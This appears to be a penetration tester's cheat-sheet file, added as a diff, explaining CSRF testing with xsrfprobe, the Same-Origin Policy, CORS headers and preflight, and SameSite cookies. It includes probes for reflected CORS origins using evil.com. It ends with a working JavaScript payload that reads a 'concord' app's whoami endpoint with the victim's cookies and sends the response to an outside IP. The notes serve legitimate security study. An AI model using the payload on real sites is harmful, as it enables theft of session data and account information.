@@ -1,0 +1,168 @@
+### csrf ###
+xsrfprobe -u http://$h/path
+xsrfprobe -u http://$h/path -c PHPSESSID=i837c5n83u4
+xsrfprobe -u http://$h/path -H "Accept=text/php, X-Requested-With=Dumb"
+xsrfprobe -u http://$h/path --crawl -E dontscanfolder/
+
+
+
+## CORS headers
+# CORS headers reduce the application's security
+# relaxing the Same-origin Policy (SOP) which prevent cross-site communication
+
+## SOP
+# origin: https://a.com/latest
+URL				Result	Reason
+https://a.com/myInfo		Allowed	Same Origin
+http://a.com/users.json		Blocked	Different Scheme and Port
+https://api.a.com/info		Blocked	Different Domain
+https://a.com**:8443**/files	Blocked	Different Port
+https://b.com/analytics		Blocked	Different Domain
+
+# the purpose of SOP is not to prevent the request for a resource from being sent,
+# but to prevent JavaScript from reading the response !!!
+# the requests would be sent, but the JavaScript on https://a.com/latest would not be able to read
+# SOP doesn't allow the JavaScript engine to access the contents of a response
+# it does allow the resource to be loaded onto the page (but js wont be able to access it)
+
+
+## CORS
+# CORS instructs a browser, via headers, which origins are allowed to access resources from the server.
+# to allow https://a.com to load data from https://api.a.com
+# the API endpoint must have a CORS header allowing the https://a.com origin.
+
+# example
+Access-Control-Allow-Origin: https://a.com
+Access-Control-Allow-Credentials: true		# can include credentials (cookies)
+Access-Control-Expose-Headers: cache-control,content-language,expires,last-modified,content-range,content-length,accept-ranges
+
+# Some requests require an HTTP preflight request (sent with the OPTIONS method)
+# Standard GET, HEAD, and POST requests don't require preflight requests
+# other request methods, requests with custom HTTP headers, or POST requests with nonstandard content-types
+# will require a preflight request
+# nonstandart is not "application/x-www-form-urlencoded", "multipart/form-data", or "text/plain"
+
+# test it in console, POST standard, no preflight !
+fetch("https://example.com",
+	{
+	method: 'post',
+	headers: {
+		"Content-type": "application/x-www-form-urlencoded;"
+	}
+	})
+
+
+# test it in console, POST nonstandard, preflight OPTIONS only !
+fetch("https://example.com",
+	{
+	method: 'post',
+	headers: {
+		"Content-type": "application/json;"
+	}
+	})
+
+# test it in console, POST nonstandard, preflight OPTIONS, response contains CORS allowing the POST !
+fetch("https://cors-test.appspot.com/test",
+	{
+	method: 'post',
+	headers: {
+		"Content-type": "application/json;"
+	}
+	})
+
+# Unfortunately, Access-Control-Allow-Origin only lets sites set a single origin.
+# For this reason, developers found a creative (and insecure) solution.
+# By dynamically setting the Access-Control-Allow-Origin header to the origin of the request
+
+
+
+##########################
+## Discover unsafe CORS ##
+##########################
+## Discover unsafe CORS header
+# send GET to /api/service/console/whoami
+GET /api/service/console/whoami HTTP/1.1
+	Access-Control-Allow-Origin: *
+
+# send GET with Origin header
+GET /api/service/console/whoami HTTP/1.1
+Origin: http://evil.com
+	Access-Control-Allow-Origin: http://evil.com			# server auto adding origin
+	Access-Control-Allow-Credentials: true
+
+# send with OPTIONS
+OPTIONS /api/service/console/whoami HTTP/1.1
+Origin: http://evil.com
+	Access-Control-Allow-Origin: *					# all allowed but to creds=true
+
+
+
+########################
+## SameSite Attribute ##
+########################
+# This attribute defines whether or not cookies are restricted to a same-site context.
+# There are three possible values for this attribute: Strict, None, and Lax.
+
+# Example
+Set-Cookie: session=ABCDEFGHIJKLMNO; Path=/; Max-Age=0;
+SameSite=Lax;
+
+## Strict
+# the browser will only send those cookies when the user is on the corresponding website.
+# Strict also prevents the cookies from being sent on navigation actions
+# (i.e. clicking a link to funnycatpictures.com) or within loaded iframes.
+
+## None
+# cookies will be sent in all contexts: when navigating, when loading images, and when loading iframes
+# The None value requires the Secure attribute, which ensures the cookie is only sent via HTTPS
+
+## Lax
+# cookies will be sent on some requests across different sites
+# it must meet both of the following requirements
+#   It must use a method that does not facilitate a change on the server (GET, HEAD, OPTIONS)
+#   It must originate from user-initiated navigation
+#   (clicking a link will include the cookie, but requests made by images or scripts will not)
+
+# Lax default : Chrome Version 80 and Edge Version 86
+# None default: Firefox and Safari
+# IE dont support at all
+
+
+## test it on concord app, no SameSite attrib
+GET /api/service/console/whoami HTTP/1.1
+Set-Cookie: rememberMe=deleteMe; Path=/; Max-Age=0; Expires=Sun, 16-Jun-2024 20:26:49 GMT
+
+
+## CSRF token ?
+# if the site is vulnerable to permissive CORS headers, we would be able to extract a CSRF token
+
+
+## Example
+fetch("http://concord:8001/api/service/console/whoami", {
+  credentials: 'include'
+})
+.then(async (response) => {
+  if(response.status != 401){
+    let data = await response.text();
+    fetch("http://192.168.118.2/?msg=" + data )
+  }else{
+    fetch("http://192.168.118.2/?msg=UserNotLoggedIn" )
+  }
+})
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
